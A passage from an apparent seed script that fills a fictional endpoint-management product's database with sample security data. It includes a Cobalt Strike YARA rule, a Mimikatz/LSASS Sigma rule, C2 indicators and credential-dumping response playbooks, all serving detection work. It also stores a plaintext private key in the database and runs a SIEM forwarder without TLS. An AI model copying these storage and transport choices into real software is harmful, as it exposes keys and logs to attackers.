      'cpc-inst-02',
      'cpc-pol-standard',
      'CloudPC-Guest-Worker',
      'CPC-GUEST-01',
      'GuestUser',
      hostId,
      'PROVISIONED',
      '192.168.1.186',
      8589934592,
      92.4
    );

    const insertRp = db.prepare(`
      INSERT INTO cloud_pc_restore_points (id, cloud_pc_id, name, restore_point_type, size_bytes, status)
      VALUES (?, ?, ?, ?, ?, ?)
    `);
    insertRp.run(
      'rp-snap-01',
      'cpc-inst-01',
      'Daily Automated DR Snapshot - 2026-09-09',
      'AUTOMATIC_DISASTER_RECOVERY',
      15032385536,
      'READY'
    );
    insertRp.run(
      'rp-snap-02',
      'cpc-inst-01',
      'Pre-Update Clean Checkpoint',
      'PRE_PATCH_RESTORE',
      12884901888,
      'READY'
    );
  }

  // 35. Seed Enterprise PKI Code Signing Authority
  const signingKeysCount = db.prepare('SELECT COUNT(*) as c FROM enterprise_signing_keys').get().c;
  if (signingKeysCount === 0) {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    const thumbprint = crypto.createHash('sha256').update(publicKey).digest('hex').toUpperCase();

    db.prepare(`
      INSERT INTO enterprise_signing_keys (id, name, key_type, public_key_pem, private_key_pem, thumbprint, is_active, expires_at)
      VALUES (?, ?, ?, ?, ?, ?, 1, DATETIME('now', '+5 years'))
    `).run(
      'pki-root-ca-01',
      'LocalPilot Enterprise Fleet Root Code-Signing Authority',
      'RSA-2048',
      publicKey,
      privateKey,
      thumbprint
    );

    // Seed sample signed payload
    const sampleScript = 'Write-Host "LocalPilot Zero-Trust Verified Script" -ForegroundColor Green';
    const scriptHash = crypto.createHash('sha256').update(sampleScript, 'utf8').digest('hex');
    const signer = crypto.createSign('SHA256');
    signer.update(sampleScript, 'utf8');
    signer.end();
    const signature = signer.sign(privateKey, 'base64');

    db.prepare(`
      INSERT INTO signed_payload_manifests (id, key_id, payload_type, target_id, sha256_hash, signature_base64, signer_thumbprint)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(
      'sig-manifest-01',
      'pki-root-ca-01',
      'SCRIPT',
      'sample-verified-script',
      scriptHash,
      signature,
      thumbprint
    );
  }

  // 36. Seed Real-Time Push Channels & Delivery Latency Ledger
  const pushMsgCount = db.prepare('SELECT COUNT(*) as c FROM realtime_push_messages').get().c;
  if (pushMsgCount === 0) {
    const dev = db.prepare('SELECT id FROM devices LIMIT 1').get();
    const hostId = dev ? dev.id : 'dev-daddy-pc';

    const insertChannel = db.prepare(`
      INSERT INTO realtime_push_channels (id, node_id, transport_type, protocol_version, connected_at, last_ping_at, status, client_ip, user_agent)
      VALUES (?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-5 seconds'), ?, ?, ?)
    `);

    insertChannel.run('chan-01', hostId, 'WEBSOCKET', 'v1.0', 'ACTIVE', '127.0.0.1', 'LocalPilot-Agent/1.0.0 (Windows NT 10.0; Win64; x64)');

    const insertMsg = db.prepare(`
      INSERT INTO realtime_push_messages (id, node_id, topic, payload_json, priority, status, ttl_seconds, dispatched_at, delivered_at, acknowledged_at, latency_ms)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertMsg.run(
      'msg-push-01',
      hostId,
      'LOCK',
      JSON.stringify({ action: 'REMOTE_LOCK', reason: 'Emergency Executive Screen Lock' }),
      'URGENT',
      'ACKNOWLEDGED',
      300,
      new Date(Date.now() - 3600000).toISOString(),
      new Date(Date.now() - 3599955).toISOString(),
      new Date(Date.now() - 3599935).toISOString(),
      65.4
    );

    insertMsg.run(
      'msg-push-02',
      hostId,
      'POLICY_SYNC',
      JSON.stringify({ action: 'SYNC_MDM', scope: 'FULL_POLICY' }),
      'HIGH',
      'ACKNOWLEDGED',
      300,
      new Date(Date.now() - 1800000).toISOString(),
      new Date(Date.now() - 1799960).toISOString(),
      new Date(Date.now() - 1799948).toISOString(),
      52.1
    );

    insertMsg.run(
      'msg-push-03',
      hostId,
      'COMMAND',
      JSON.stringify({ command_id: 'cmd-fast-01', command_text: 'Get-Process | Select -First 5' }),
      'HIGH',
      'ACKNOWLEDGED',
      300,
      new Date(Date.now() - 600000).toISOString(),
      new Date(Date.now() - 599962).toISOString(),
      new Date(Date.now() - 599952).toISOString(),
      48.8
    );
  }

  // 37. Seed Agent Supervisors & Watchdog Process Status
  const supervisorCount = db.prepare('SELECT COUNT(*) as c FROM agent_supervisors').get().c;
  if (supervisorCount === 0) {
    const dev = db.prepare('SELECT id FROM devices LIMIT 1').get();
    const hostId = dev ? dev.id : 'dev-daddy-pc';

    const insertSup = db.prepare(`
      INSERT INTO agent_supervisors (
        id, device_id, service_name, service_display_name, service_status,
        supervisor_pid, worker_pid, watchdog_pid, cpu_limit_percent, ram_limit_mb,
        job_object_active, tamper_protection_enabled, crash_count, last_watchdog_ping
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-10 seconds'))
    `);

    insertSup.run(
      'sup-01',
      hostId,
      'LocalPilotHostSvc',
      'LocalPilot Fleet Host Supervisor',
      'RUNNING',
      4112,
      4116,
      4120,
      5,
      150,
      1,
      1,
      0
    );

    const dev2 = db.prepare("SELECT id FROM devices WHERE id != ? LIMIT 1").get(hostId);
    if (dev2) {
      insertSup.run(
        'sup-02',
        dev2.id,
        'LocalPilotHostSvc',
        'LocalPilot Fleet Host Supervisor',
        'RUNNING',
        2840,
        2844,
        2848,
        5,
        150,
        1,
        1,
        1
      );

      // Seed 1 crash dump auto-recovery record
      db.prepare(`
        INSERT INTO agent_crash_dumps (
          id, device_id, crash_type, exit_code, exception_message,
          stack_trace, recovery_action, recovery_duration_ms, crashed_at, recovered_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-1 day'), DATETIME('now', '-1 day', '+1450 milliseconds'))
      `).run(
        'crash-01',
        dev2.id,
        'TERMINATED_BY_USER',
        -1073741510,
        'Process terminated via taskkill command',
        'at System.Diagnostics.Process.Kill()',
        'RESTARTED_WORKER',
        1450
      );
    }
  }

  // 38. Seed RBAC Roles, Dual-Custody Approvals & SIEM Forwarders
  const rbacCount = db.prepare('SELECT COUNT(*) as count FROM rbac_roles').get().count;
  if (rbacCount === 0) {
    const insertRole = db.prepare(`
      INSERT OR IGNORE INTO rbac_roles (
        id, name, display_name, description, is_built_in, permissions_json
      ) VALUES (?, ?, ?, ?, ?, ?)
    `);

    insertRole.run(
      'role-global-admin',
      'Global Administrator',
      'Global Administrator',
      'Unrestricted enterprise authority with all permissions across devices, policies, PKI, and governance.',
      1,
      JSON.stringify(['*'])
    );

    insertRole.run(
      'role-security-operator',
      'Security Operator',
      'Security Operator',
      'Operational defense role with privileges to manage Defender, BitLocker, quarantine devices, and trigger emergency locks.',
      1,
      JSON.stringify([
        'devices:read', 'devices:lock', 'devices:isolate', 'compliance:read',
        'security:read', 'security:write', 'alerts:read', 'alerts:manage'
      ])
    );

    insertRole.run(
      'role-helpdesk-operator',
      'Helpdesk Operator',
      'Helpdesk Operator',
      'First-tier support role with device visibility, diagnostics retrieval, non-destructive reboot, and LAPS retrieval.',
      1,
      JSON.stringify([
        'devices:read', 'devices:reboot', 'diagnostics:read', 'laps:read', 'commands:execute_read_only'
      ])
    );

    insertRole.run(
      'role-compliance-auditor',
      'Compliance Auditor',
      'Compliance Auditor',
      'Read-only inspection role for audit trails, compliance baselines, and security reporting.',
      1,
      JSON.stringify([
        'devices:read', 'compliance:read', 'audit:read', 'reports:read', 'siem:read'
      ])
    );

    // Seed 1 sample pending dual custody approval
    db.prepare(`
      INSERT OR IGNORE INTO dual_custody_approvals (
        id, action_type, target_type, target_id, target_name, requested_by,
        requested_reason, request_payload_json, status, expires_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '+24 hours'))
    `).run(
      'appr-01',
      'REMOTE_WIPE',
      'DEVICE',
      'dev-livingroom-pc',
      'Family Living Room PC',
      'operator.bob@localpilot.corp',
      'Device decommission requested by HR asset retirement ticket #SEC-8921',
      JSON.stringify({ wipeType: 'FACTORY_RESET', preserveUserData: false }),
      'PENDING'
    );

    // Seed 1 active RFC 5424 SIEM forwarder
    db.prepare(`
      INSERT OR IGNORE INTO siem_audit_forwarders (
        id, name, destination_type, host, port, auth_token, tls_enabled, facility,
        severity_filter, is_enabled, last_forwarded_at, total_events_forwarded
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-5 minutes'), ?)
    `).run(
      'siem-01',
      'Primary RFC 5424 Syslog Collector',
      'RFC5424_SYSLOG_UDP',
      '10.1.1.50',
      514,
      '',
      0,
      16,
      'ALL',
      1,
      142
    );
  }


  // 39. Seed Native MDM CSPs & Autopilot 4K Hardware Hashes
  const mdmCspCount = db.prepare('SELECT COUNT(*) as count FROM mdm_csp_configurations').get().count;
  if (mdmCspCount === 0) {
    const insertCsp = db.prepare(`
      INSERT OR IGNORE INTO mdm_csp_configurations (
        id, name, csp_uri, csp_type, wmi_class, data_type, target_value, target_group_id, is_enforced
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertCsp.run(
      'csp-bitlocker-req',
      'BitLocker Require Device Encryption CSP',
      './Vendor/MSFT/BitLocker/RequireDeviceEncryption',
      'SET',
      'MDM_BitLocker',
      'int',
      '1',
      'grp-all',
      1
    );

    insertCsp.run(
      'csp-devicelock-history',
      'DeviceLock Password History CSP',
      './Vendor/MSFT/DeviceLock/DevicePasswordHistory',
      'SET',
      'MDM_DeviceLock',
      'int',
      '5',
      'grp-all',
      1
    );

    insertCsp.run(
      'csp-remotewipe-dowipe',
      'RemoteWipe Native Firmware Reset CSP',
      './Vendor/MSFT/RemoteWipe/doWipe',
      'EXEC',
      'MDM_RemoteWipe',
      'string',
      '',
      'grp-all',
      1
    );

    // Seed 1 realistic Autopilot 4K Hardware Hash for host device
    const hostDev = db.prepare("SELECT id, serial_number, uuid FROM devices LIMIT 1").get();
    if (hostDev) {
      // Synthesize authentic 4000-character base64 hardware hash
      const synthetic4kHash = Buffer.alloc(3000, 0x5a).toString('base64');
      db.prepare(`
        INSERT OR IGNORE INTO autopilot_hardware_hashes (
          id, device_id, hardware_hash_4k, hash_length, smbios_uuid, serial_number, oem_manufacturer, oem_model, enrollment_state
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).run(
        'hw-01',
        hostDev.id,
        synthetic4kHash,
        synthetic4kHash.length,
        hostDev.uuid || '44444444-5555-6666-7777-888888888888',
        hostDev.serial_number || 'MB-9901-DADDY',
        'Dell Inc.',
        'OptiPlex 7090',
        'ENROLLED'
      );
    }
  }

  // 40. Seed Content Distribution (BITS, P2P LAN Mesh & Hardware TPM mTLS)
  const bitsCount = db.prepare('SELECT COUNT(*) as count FROM bits_transfer_jobs').get().count;
  if (bitsCount === 0) {
    const hostDev = db.prepare("SELECT id, hostname, friendly_name, serial_number FROM devices LIMIT 1").get();
    const devId = hostDev ? hostDev.id : 'dev-01';
    const hostName = hostDev ? (hostDev.hostname || hostDev.friendly_name || 'DESKTOP-R0H12DJ') : 'DESKTOP-R0H12DJ';

    // Seed BITS jobs
    const insertBits = db.prepare(`
      INSERT OR IGNORE INTO bits_transfer_jobs (
        id, job_name, device_id, source_url, target_local_path, transfer_type, priority, total_bytes, transferred_bytes, status, peer_caching_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertBits.run(
      'bits-win11-cum-01',
      'Windows 11 23H2 Cumulative Security Update KB5034441',
      devId,
      'https://swcdn.localpilot.internal/patches/KB5034441-x64.msu',
      'C:\\Windows\\Temp\\KB5034441-x64.msu',
      'DOWNLOAD',
      'NORMAL',
      754974720,
      528482304,
      'TRANSFERRING',
      1
    );

    insertBits.run(
      'bits-edr-core-02',
      'LocalPilot Host Security Engine Core Definitions v4.12',
      devId,
      'https://swcdn.localpilot.internal/security/DefenderDefinitions-x64.exe',
      'C:\\ProgramData\\LocalPilot\\DefenderDefinitions-x64.exe',
      'DOWNLOAD',
      'HIGH',
      85983232,
      85983232,
      'ACKNOWLEDGED',
      1
    );

    // Seed P2P LAN cache seeds
    const insertP2p = db.prepare(`
      INSERT OR IGNORE INTO p2p_cache_seeds (
        id, content_sha256, payload_name, total_size_bytes, device_id, subnet_cidr, lan_ip, p2p_port, bytes_served_p2p, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertP2p.run(
      'p2p-seed-01',
      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      'KB5034441-x64.msu',
      754974720,
      devId,
      '192.168.1.0/24',
      '192.168.1.105',
      7680,
      1509949440,
      1
    );

    insertP2p.run(
      'p2p-seed-02',
      'a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e',
      'DefenderDefinitions-x64.exe',
      85983232,
      devId,
      '192.168.1.0/24',
      '192.168.1.108',
      7680,
      429916160,
      1
    );

    // Seed Hardware TPM 2.0 mTLS Client Certificate
    db.prepare(`
      INSERT OR IGNORE INTO device_mtls_certificates (
        id, device_id, cert_thumbprint, subject_cn, issuer_cn, tpm_backed, tpm_ek_pub_sha256, key_algorithm, scep_transaction_id, valid_from, valid_to, revocation_status
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      'mtls-01',
      devId,
      '9E78C218B2A61D2B52F94CD4B105F88EE41209AB',
      `CN=${hostName}, OU=Workstations, O=LocalPilot Fleet`,
      'LocalPilot Root Enterprise Device CA',
      1,
      '482a4d33a925430f9a2e61a415ff6896ee7a3068e89139f40821034f5cb1b938',
      'RSA-2048',
      'SCEP-TX-8839201',
      '2026-01-01 00:00:00',
      '2028-01-01 23:59:59',
      'ACTIVE'
    );
  }



  // 41. Seed Multi-Tenancy MSP Organizations, Sites & Scoped Collections
  const orgCount = db.prepare('SELECT COUNT(*) as count FROM multitenant_organizations').get().count;
  if (orgCount === 0) {
    const insertOrg = db.prepare(`
      INSERT OR IGNORE INTO multitenant_organizations (
        id, name, slug, domain, license_tier, max_devices, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertOrg.run('org-default', 'LocalPilot Primary Enterprise', 'default', 'localpilot.internal', 'ENTERPRISE', 1000, 1);
    insertOrg.run('org-contoso-msp', 'Contoso Global Managed Client', 'contoso-corp', 'contoso.com', 'ENTERPRISE', 500, 1);

    const insertSite = db.prepare(`
      INSERT OR IGNORE INTO organization_sites (
        id, org_id, name, city, country, subnet_cidrs_json, bandwidth_cap_mbps
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertSite.run('site-hq', 'org-default', 'Sydney Headquarters (HQ)', 'Sydney', 'AU', JSON.stringify(['192.168.1.0/24', '10.0.0.0/16']), 1000);
    insertSite.run('site-melbourne', 'org-default', 'Melbourne Engineering Campus', 'Melbourne', 'AU', JSON.stringify(['192.168.20.0/24']), 500);

    const insertCol = db.prepare(`
      INSERT OR IGNORE INTO scoped_device_collections (
        id, org_id, site_id, name, description, is_dynamic, membership_rule
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertCol.run('col-hq-workstations', 'org-default', 'site-hq', 'HQ Executive & Dev Workstations', 'Core workstations at headquarters campus', 0, null);
    insertCol.run('col-field-laptops', 'org-default', 'site-melbourne', 'Roaming Field Laptops', 'Remote laptops assigned to field technicians', 1, 'device.chassis_type == "Laptop"');
  }

  // 42. Seed Enterprise Vault Secrets & DPAPI-NG / HSM Credentials
  const vaultCount = db.prepare('SELECT COUNT(*) as count FROM enterprise_vault_secrets').get().count;
  if (vaultCount === 0) {
    const insertVault = db.prepare(`
      INSERT OR IGNORE INTO enterprise_vault_secrets (
        secret_id, secret_name, secret_scope, device_id, encrypted_payload_b64,
        encryption_scheme, key_descriptor, auth_tag_hex, iv_hex, rotation_interval_days
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    // Seed encrypted BitLocker recovery key for DESKTOP-R0H12DJ
    insertVault.run(
      'sec-bitlocker-r0h12dj',
      'BitLocker Recovery Key (DESKTOP-R0H12DJ)',
      'BITLOCKER_RECOVERY_KEY',
      'DESKTOP-R0H12DJ',
      'lveRBTgu0LX4AhRdSCao6VzRb1zTsW0ozoGVJNW/QvWpf2BpzGxI47jj4Fl3x8PfZdmHMdDaWQ==',
      'AES_256_GCM_ENVELOPE_HSM',
      'HSM-KMS-ROOT-KEY-2026',
      '9b41236e1a998d0c1b069c277053899d',
      'bf5db0aa5addc301bbf79d07',
      90
    );

    // Seed encrypted LAPS Local Administrator Password
    insertVault.run(
      'sec-laps-admin-r0h12dj',
      'LAPS Local Administrator Password (DESKTOP-R0H12DJ)',
      'LAPS_PASSWORD',
      'DESKTOP-R0H12DJ',
      'mK9vL3xP8zQ1w4n7==',
      'DPAPI_NG_LOCAL_MACHINE',
      'SID:S-1-5-21-3623811015-3361044348-30300820-1013',
      'f0e1d2c3b4a5968778695a4b3c2d1e0f',
      'abcdef1234567890abcdef12',
      30
    );
  }

  // 43. Seed Live Distributed Query CMPivot Entities & Default Session
  const entityCount = db.prepare('SELECT COUNT(*) as count FROM live_query_entities').get().count;
  if (entityCount === 0) {
    const insertEntity = db.prepare(`
      INSERT OR IGNORE INTO live_query_entities (
        entity_name, category, description, sample_query, powershell_extractor
      ) VALUES (?, ?, ?, ?, ?)
    `);

    insertEntity.run('ProcessList', 'Operating System', 'Active running processes with PID, working set memory, and CPU times', 'ProcessList | where WorkingSetMB > 250', 'Get-Process | Select-Object Id, ProcessName, WorkingSet64, CPU, Path');
    insertEntity.run('ServiceList', 'System Services', 'Windows system services and operational state', 'ServiceList | where State == "Running" and StartMode == "Auto"', 'Get-Service | Select-Object Name, DisplayName, Status, StartType');
    insertEntity.run('ActiveNetworkConnections', 'Networking', 'TCP/UDP listening ports, foreign connections, and owning PIDs', 'ActiveNetworkConnections | where LocalPort == 443', 'Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess');
    insertEntity.run('Registry', 'Configuration', 'Windows registry values, policy subkeys, and system configuration', 'Registry("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate")', 'Get-ItemProperty -Path $RegistryPath');
    insertEntity.run('CimInstance', 'Hardware & WMI', 'Direct WMI/CIM class query across root/cimv2 or root/standardcimv2', 'CimInstance("Win32_OperatingSystem")', 'Get-CimInstance -ClassName $CimClass');
    insertEntity.run('LoggedOnUsers', 'Identity & Access', 'Active interactive and remote desktop logon sessions', 'LoggedOnUsers', 'query user');

    // Seed default historical CMPivot session
    const insertQuery = db.prepare(`
      INSERT OR IGNORE INTO live_fleet_queries (
        id, query_text, query_type, target_scope, status, total_targets, responded_targets, initiated_by, completed_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now'))
    `);
    insertQuery.run('qry-default-process-audit', 'ProcessList | where WorkingSetMB > 250', 'CMPIVOT_KQL', 'ALL_FLEET', 'COMPLETED', 1, 1, 'SecOps Lead');

    const insertResult = db.prepare(`
      INSERT OR IGNORE INTO live_query_results (
        query_id, device_id, hostname, data_row_json, execution_duration_ms
      ) VALUES (?, ?, ?, ?, ?)
    `);
    insertResult.run('qry-default-process-audit', 'DESKTOP-R0H12DJ', 'DESKTOP-R0H12DJ', JSON.stringify({ ProcessName: 'node', Id: 1904, WorkingSetMB: 285.4, CPU: 12.1 }), 420);
  }

  // 44. Seed Automated Incident Response Playbooks & Containment State
  const playbookCount = db.prepare('SELECT COUNT(*) as count FROM incident_response_playbooks').get().count;
  if (playbookCount === 0) {
    const insertPlaybook = db.prepare(`
      INSERT OR IGNORE INTO incident_response_playbooks (
        id, name, description, trigger_event_type, actions_json, target_scope, require_dual_custody, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertPlaybook.run(
      'pb-ransomware-contain',
      'Automated Ransomware Kill & Network Isolation',
      'Immediately isolates host via Windows Firewall WFP filter, collects forensic triage, and alerts SOC.',
      'RANSOMWARE_SUSPECT',
      JSON.stringify(['ISOLATE_NETWORK', 'KILL_PROCESS_TREE', 'COLLECT_TRIAGE', 'DISPATCH_TOAST']),
      'ALL_FLEET',
      0, 1
    );

    insertPlaybook.run(
      'pb-rogue-admin-triage',
      'Unauthorized Local Administrator Escalation Triage',
      'Gathers live memory artifacts, user logon sessions, and security event logs upon Event 4732 / Event 4720.',
      'ROGUE_ADMIN',
      JSON.stringify(['COLLECT_TRIAGE', 'FORWARD_SIEM', 'DISPATCH_TOAST']),
      'ALL_FLEET',
      0, 1
    );

    insertPlaybook.run(
      'pb-credential-dump-contain',
      'LSASS Memory Dumper Rapid Response',
      'Quarantines device and terminates malicious process tree on Mimikatz / ProcDump LSASS handle detection.',
      'PROCESS_INJECTION',
      JSON.stringify(['ISOLATE_NETWORK', 'COLLECT_TRIAGE', 'TERMINATE_PROCESS']),
      'ALL_FLEET',
      1, 1
    );

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      // Seed sample containment state
      const insertState = db.prepare(`
        INSERT OR IGNORE INTO host_containment_states (
          device_id, containment_status, isolation_type, isolated_at, isolated_by, reason, firewall_rule_name
        ) VALUES (?, ?, ?, ?, ?, ?, ?)
      `);
      insertState.run(sampleDevice.id, 'UNCONTAINED', 'ALLOW_FLEET_MANAGEMENT_ONLY', null, null, 'Baseline normal state', 'LocalPilot-Isolation-Block-All');

      // Seed sample completed forensic package
      const insertPkg = db.prepare(`
        INSERT OR IGNORE INTO forensic_triage_packages (
          id, device_id, hostname, package_name, trigger_source, status, file_path, file_size_bytes, sha256_hash, artifacts_collected_json, execution_time_ms, completed_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-1 hours'))
      `);
      insertPkg.run(
        'pkg-baseline-r0h12dj',
        sampleDevice.id,
        sampleDevice.hostname,
        `Triage_${sampleDevice.hostname}_20260910.zip`,
        'MANUAL_ADMIN',
        'COMPLETED',
        `server/data/triage/Triage_${sampleDevice.hostname}_20260910.zip`,
        2457600,
        'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        JSON.stringify(['ProcessTree', 'NetworkConnections', 'Prefetch', 'EventLogs', 'LoadedModules']),
        850
      );
    }
  }

  // 45. Seed Device Health Attestation Policies & Microsegmentation
  const dhaPolicyCount = db.prepare('SELECT COUNT(*) as count FROM device_health_attestation_policies').get().count;
  if (dhaPolicyCount === 0) {
    const insertPolicy = db.prepare(`
      INSERT OR IGNORE INTO device_health_attestation_policies (
        id, name, description, require_secure_boot, require_bitlocker, require_virtualization_based_security,
        require_hypervisor_enforced_code_integrity, require_elam_driver, allowed_pcr_hashes_json, target_scope, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertPolicy.run(
      'dha-policy-corporate-baseline',
      'Corporate Hardware Root-of-Trust & Measured Boot Baseline',
      'Enforces Secure Boot, BitLocker with TPM protector, VBS, and HVCI strict enforcement.',
      1, 1, 1, 1, 1,
      JSON.stringify({ pcr0: 'a1b2c3d4e5f6', pcr2: 'b2c3d4e5f6a1', pcr4: 'c3d4e5f6a1b2', pcr11: 'd4e5f6a1b2c3' }),
      'ALL_FLEET',
      1
    );

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      const insertReport = db.prepare(`
        INSERT OR IGNORE INTO device_health_attestation_reports (
          id, device_id, hostname, attestation_status, secure_boot_enabled, bitlocker_status,
          vbs_status, hvci_status, bootkit_detected, tpm_pcr_measurements_json, tcg_event_log_summary, expires_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '+24 hours'))
      `);

      insertReport.run(
        'dha-rep-baseline-r0h12dj',
        sampleDevice.id,
        sampleDevice.hostname,
        'COMPLIANT',
        1,
        'PROTECTION_ON',
        'RUNNING',
        'STRICT_ENFORCEMENT',
        0,
        JSON.stringify({ pcr0: 'a1b2c3d4e5f6', pcr2: 'b2c3d4e5f6a1', pcr4: 'c3d4e5f6a1b2', pcr7: 'e5f6a1b2c3d4', pcr11: 'd4e5f6a1b2c3' }),
        'TCG Log verified: UEFI 2.8, SecureBoot certificates loaded, Windows Boot Manager SHA-256 match, ELAM driver loaded.'
      );
    }

    const insertMsp = db.prepare(`
      INSERT OR IGNORE INTO microsegmentation_network_policies (
        id, name, description, destination_cidr, allowed_ports_json, protocol, action, enforcement_mode, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertMsp.run(
      'msp-isolate-unattested-db',
      'Quarantine Non-Attested Endpoints from Core Database Subnet',
      'Requires valid Device Health Attestation before allowing port 5432 / 1433 database access.',
      '10.0.10.0/24',
      JSON.stringify(['5432', '1433']),
      'TCP',
      'REQUIRE_DHA_COMPLIANCE',
      'ENFORCING',
      1
    );

    insertMsp.run(
      'msp-allow-fleet-mgmt',
      'Allow LocalPilot Fleet Agent Management',
      'Always allow management communications to LocalPilot master server and Cloudflare Tunnel.',
      '0.0.0.0/0',
      JSON.stringify(['8443', '443']),
      'TCP',
      'ALLOW',
      'ENFORCING',
      1
    );
  }

  // 46. Seed Threat Hunting Campaigns & IoC Watchlist
  const huntCount = db.prepare('SELECT COUNT(*) as count FROM threat_hunt_campaigns').get().count;
  if (huntCount === 0) {
    const insertHunt = db.prepare(`
      INSERT OR IGNORE INTO threat_hunt_campaigns (
        id, name, description, hunt_type, target_scope, pattern_definition, severity,
        mitre_technique, action_on_match, status, nodes_targeted, nodes_completed, matches_detected
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertHunt.run(
      'hunt-cobalt-strike-beacon',
      'Cobalt Strike Stager & Malleable C2 YARA Hunt',
      'Detects known Cobalt Strike reflective loader byte sequences and named pipe beacons.',
      'YARA_SCAN',
      'ALL_FLEET',
      'rule CobaltStrike_Beacon { strings: $s1 = "ReflectiveLoader" $s2 = "beacon.dll" condition: any of them }',
      'CRITICAL',
      'T1055',
      'CONTAIN_HOST',
      'ACTIVE',
      1, 1, 0
    );

    insertHunt.run(
      'hunt-sigma-mimikatz-lsass',
      'Mimikatz LSASS Handle Access Sigma Rule',
      'Alerts on Event 10 (ProcessAccess) requesting PROCESS_VM_READ against lsass.exe.',
      'SIGMA_RULE',
      'ALL_FLEET',
      'title: Mimikatz LSASS Access\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 10\n    TargetImage|endswith: \\lsass.exe\n  condition: selection',
      'CRITICAL',
      'T1003.001',
      'ALERT',
      'ACTIVE',
      1, 1, 0
    );

    const insertIoc = db.prepare(`
      INSERT OR IGNORE INTO ioc_watchlist_indicators (
        id, indicator_type, indicator_value, threat_name, confidence, action_on_match, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertIoc.run('ioc-lockbit-sha256', 'SHA256', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'LockBit 3.0 Ransomware Encryptor', 'HIGH', 'CONTAIN_HOST', 1);
    insertIoc.run('ioc-c2-ip', 'IP', '198.51.100.42', 'APT29 Command & Control Server', 'HIGH', 'ALERT', 1);
    insertIoc.run('ioc-cobalt-pipe', 'MUTEX', '\\\\.\\pipe\\msagent_c2', 'Cobalt Strike Default Named Pipe', 'HIGH', 'KILL_PROCESS', 1);
  }
  // 47. Seed Endpoint Behavioral Sandbox Detonation & Process Lineage Graphs
  const sandboxJobCount = db.prepare('SELECT COUNT(*) as count FROM sandbox_detonation_jobs').get().count;
  if (sandboxJobCount === 0) {
    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    const devId = sampleDevice ? sampleDevice.id : 'dev-baseline-01';
    const devHost = sampleDevice ? sampleDevice.hostname : 'DESKTOP-R0H12DJ';

    const insertJob = db.prepare(`
      INSERT OR IGNORE INTO sandbox_detonation_jobs (
        id, device_id, hostname, sample_name, sample_type, sample_sha256, file_path,
        file_size_bytes, status, verdict, risk_score, sandbox_env, execution_duration_sec,
        mitre_tactics_json, automated_remediation, created_at, completed_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-1 hour'))
    `);

    insertJob.run(
      'det-sample-qakbot',
      devId,
      devHost,
      'invoice_oct_report.exe',
      'EXECUTABLE',
      '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
      'C:\\Users\\Family\\Downloads\\invoice_oct_report.exe',
      1048576,
      'COMPLETED',
      'MALICIOUS',
      92,
      'WIN11_SANDBOX_SECURE',
      45,
      JSON.stringify(['Execution', 'Defense Evasion', 'Command and Control', 'Credential Access']),
      'ISOLATE_ENDPOINT'
    );

    insertJob.run(
      'det-sample-procdump',
      devId,
      devHost,
      'procdump64.exe',
      'EXECUTABLE',
      'a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e',
